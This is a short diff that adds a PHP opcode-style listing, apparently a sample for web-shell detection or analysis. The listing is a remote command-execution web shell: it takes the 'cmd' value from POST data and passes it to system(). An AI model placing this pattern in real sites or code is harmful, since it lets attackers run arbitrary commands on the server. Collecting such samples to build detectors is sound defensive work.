@@ -1,0 +1,7 @@
+FunctionStart 
+INIT_FCALL 'system'
+FETCH_R '_POST'
+FETCH_DIM_R 'cmd'
+DO_ICALL 
+RETURN 1
+FunctionEnd 
